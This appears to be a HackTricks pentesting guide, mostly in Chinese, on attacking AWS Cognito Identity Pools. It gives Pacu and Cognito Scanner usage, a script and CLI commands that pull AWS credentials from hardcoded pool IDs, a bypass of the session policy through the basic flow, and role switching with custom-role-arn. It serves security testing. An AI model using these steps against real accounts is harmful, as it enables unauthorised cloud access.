# Cognito Identity Pools

{{#include ../../../../banners/hacktricks-training.md}}

## 基本信息

身份池在使用户能够**获取临时凭证**方面发挥着至关重要的作用。这些凭证对于访问各种AWS服务至关重要，包括但不限于Amazon S3和DynamoDB。身份池的一个显著特点是它们支持匿名访客用户以及多种身份提供者进行用户身份验证。支持的身份提供者包括：

- Amazon Cognito用户池
- 社交登录选项，如Facebook、Google、使用Amazon登录和使用Apple登录
- 符合OpenID Connect (OIDC)的提供者
- SAML (安全声明标记语言)身份提供者
- 开发者认证身份
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

要生成身份池会话，您首先需要**生成身份 ID**。这个身份 ID 是**该用户会话的标识**。这些标识可以有多达 20 个数据集，最多可以存储 1MB 的键值对。

这对于**保持用户信息**是**有用的**（用户将始终使用相同的身份 ID）。

此外，服务**cognito-sync**是允许**管理和同步这些信息**的服务（在数据集中，发送信息到流和 SNS 消息...）。

### Tools for pentesting

- [Pacu](https://github.com/RhinoSecurityLabs/pacu)，AWS 利用框架，现在包括“cognito\_\_enum”和“cognito\_\_attack”模块，这些模块自动枚举账户中的所有 Cognito 资产并标记弱配置、用于访问控制的用户属性等，同时还自动创建用户（包括 MFA 支持）和基于可修改自定义属性、可用身份池凭证、可假设角色的 ID 令牌等的权限提升。

有关模块功能的描述，请参见[博客文章](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)的第 2 部分。有关安装说明，请参见主 [Pacu](https://github.com/RhinoSecurityLabs/pacu) 页面。

#### Usage

示例 cognito\_\_attack 用法，尝试在给定身份池和用户池客户端上创建用户和所有权限提升向量：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
示例 cognito\_\_enum 用法，以收集当前 AWS 账户中可见的所有用户池、用户池客户端、身份池、用户等：
```bash
Pacu (new:test) > run cognito__enum
```
- [Cognito Scanner](https://github.com/padok-team/cognito-scanner) 是一个用 Python 实现的 CLI 工具，执行对 Cognito 的不同攻击，包括不必要的账户创建和身份池升级。

#### 安装
```bash
$ pip install cognito-scanner
```
#### 用法
```bash
$ cognito-scanner --help
```
有关更多信息，请查看 https://github.com/padok-team/cognito-scanner

## 访问 IAM 角色

### 未认证

攻击者需要知道的唯一信息是 **在 Cognito 应用中获取 AWS 凭证** 的 **身份池 ID**，并且此 **ID 必须硬编码** 在 web/mobile **应用程序** 中以供使用。ID 看起来像这样：`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`（无法通过暴力破解获得）。

> [!TIP]
> 默认情况下，通过创建的 **IAM Cognito 未认证角色称为** `Cognito_<Identity Pool name>Unauth_Role`

如果您发现一个硬编码的身份池 ID 并且它允许未认证用户，您可以通过以下方式获取 AWS 凭证：
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
或者你可以使用以下 **aws cli 命令**：
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
> [!WARNING]
> 请注意，默认情况下，未经身份验证的 cognito **用户无法拥有任何权限，即使通过策略分配了权限**。请查看以下部分。

### 增强与基本身份验证流程

上一部分遵循了 **默认增强身份验证流程**。此流程为生成的 IAM 角色会话设置了 **限制性** [**会话策略**](../../aws-basic-information/index.html#session-policies)。该策略仅允许会话 [**使用此列表中的服务**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)（即使该角色可以访问其他服务）。

然而，如果 **身份池启用了“基本（经典）流程”**，则有一种方法可以绕过此限制，用户将能够使用该流程获取会话，而该会话 **将没有限制性会话策略**。
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
> [!WARNING]
> 如果您收到此 **错误**，则是因为 **基本流程未启用（默认）**

> `An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`

拥有一组 IAM 凭证后，您应该检查 [您拥有的访问权限](../../index.html#whoami) 并尝试 [提升权限](../../aws-privilege-escalation/index.html)。

### 已认证

> [!NOTE]
> 请记住，**已认证用户**可能会被授予 **不同的权限**，因此如果您可以 **在应用程序内注册**，请尝试这样做并获取新凭证。

对于 **访问身份池的已认证用户**，可能还有 **角色** 可用。

为此，您可能需要访问 **身份提供者**。如果这是 **Cognito 用户池**，也许您可以利用默认行为 **自己创建一个新用户**。

> [!TIP]
> 通过 **IAM Cognito 认证角色创建的角色** 默认称为 `Cognito_<Identity Pool name>Auth_Role`

无论如何，**以下示例** 假设您已经在用于访问身份池的 **Cognito 用户池** 中登录（不要忘记，其他类型的身份提供者也可以被配置）。

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id <identity_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# 从上一个命令响应中获取 identity_id
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>


# 在 IdToken 中，您可以找到用户因用户池组而拥有的角色
# 使用 --custom-role-arn 获取特定角色的凭证
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
<strong>    --custom-role-arn <role_arn> \
</strong>    --logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
</code></pre>

> [!WARNING]
> 可以 **根据用户登录的身份提供者** 配置不同的 IAM 角色，甚至仅仅根据 **用户**（使用声明）。因此，如果您通过相同或不同的提供者访问不同的用户，可能 **值得登录并访问他们的所有 IAM 角色**。

{{#include ../../../../banners/hacktricks-training.md}}
